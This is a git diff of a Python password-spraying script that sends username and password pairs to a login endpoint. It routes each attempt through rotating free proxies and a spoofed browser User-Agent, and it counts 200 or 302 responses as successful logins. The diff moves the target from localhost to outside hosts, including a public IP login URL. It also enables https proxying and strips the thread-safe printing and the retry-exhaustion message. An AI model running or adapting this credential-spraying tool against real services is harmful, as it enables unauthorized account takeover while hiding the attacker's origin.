@@ -10,12 +10,20 @@ import rotating_free_proxies
 print_lock = threading.Lock()
 
 # Set the correct target URL for the login endpoint on your backend
-url = "http://localhost:5050/login"
-
+# url = "http://localhost:5050/login"
+url = "https://www.google.com/webhp"
+# url = "http://34.224.51.201:5050/login"
+url = "https://reqbin.com/api/v1/ip"
 # Define headers (optional)
+# headers = {
+#     'User-Agent': 'Mozilla/5.0',
+#     'Content-Type': 'application/json'  # Ensure correct content type
+# }
+
+# Example headers with a common User-Agent
 headers = {
-    'User-Agent': 'Mozilla/5.0',
-    'Content-Type': 'application/json'  # Ensure correct content type
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
+    'Content-Type': 'application/json'
 }
 
 # Function to read the usernames from a file
@@ -40,14 +48,16 @@ def read_proxies(file_path):
             # Add to the proxies list based on protocol
             if protocol == "HTTP":
                 proxies_list.append({"http": f"http://{ip_port}"
-                                    #  , "https": f"http://{ip_port}"
+                                    , "https": f"http://{ip_port}"
                                     }
                                      )
     return proxies_list
 
 base_dir = os.path.dirname(os.path.abspath(__file__))
 
-proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies2.txt')
+# proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies2.txt')
+proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies3.txt')
+
 proxies_list = read_proxies(proxy_file_path)
 
 
@@ -69,52 +79,39 @@ def attempt_login(username, password, max_retries=3):
 
         try:
             # Adding a timeout of 10 seconds for the request
-            response = requests.post(url, json=data, proxies=proxy, timeout=10)
+            # response = requests.post(url, json=data, proxies=proxy)
+            response = requests.post(url, json=data, 
+                                     proxies=proxy, 
+                                     headers=headers)
 
-            # Lock the print statements to avoid race conditions
-            with print_lock:
-                print(f"Attempt for {username}:{password} with Proxy {proxy} returned {response.status_code}")
 
             # Check the HTTP status code for valid login response
             if response.status_code == 200:
-                with print_lock:
-                    print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
+                print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
                 return True
             elif response.status_code == 302:  # Redirect (could indicate success in some systems)
-                with print_lock:
-                    print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')}) using proxy {proxy}")
+                print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')}) using proxy {proxy}")
                 return True
             elif response.status_code == 401:
-                with print_lock:
-                    print(f"[-] Failed login for {username}:{password} (Status Code: 401 Unauthorized) using proxy {proxy}")
+                print(f"[-] Failed login for {username}:{password} (Status Code: 401 Unauthorized) using proxy {proxy}")
                 return False  # No retry, incorrect username/password
             elif response.status_code == 403:
-                with print_lock:
-                    print(f"[-] Failed login for {username}:{password} (Status Code: 403 Forbidden) using proxy {proxy}")
+                print(f"[-] Failed login for {username}:{password} (Status Code: 403 Forbidden) using proxy {proxy}")
                 return False  # No retry, incorrect username/password
             else:
-                with print_lock:
-                    print(f"[-] Failed login for {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
+                print(f"[-] Failed login for {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
                 return False  # No retry, username/password issue or other error
 
         except requests.exceptions.ProxyError:
-            with print_lock:
-                print(f"[-] Proxy error occurred for {username}:{password} using proxy {proxy}, retrying...")
+            print(f"[-] Proxy error occurred for {username}:{password} using proxy {proxy}, retrying...")
         except requests.exceptions.Timeout:
-            with print_lock:
-                print(f"[-] Timeout error for {username}:{password} using proxy {proxy}, retrying...")
+            print(f"[-] Timeout error for {username}:{password} using proxy {proxy}, retrying...")
         except requests.exceptions.RequestException as e:
-            with print_lock:
-                print(f"[-] General error for {username}:{password} using proxy {proxy}: {e}, retrying...")
+            print(f"[-] General error for {username}:{password} using proxy {proxy}: {e}, retrying...")
 
         # Retry by increasing the retry count
         retries += 1
         time.sleep(2)  # Optional: Add delay before retrying
-
-    # If we exceed retries, print error message
-    with print_lock:
-        print(f"[!] Max retries reached for {username}:{password}. Skipping.")
-    return False
 
 # Function to perform password spraying
 def password_spray(usernames, passwords):
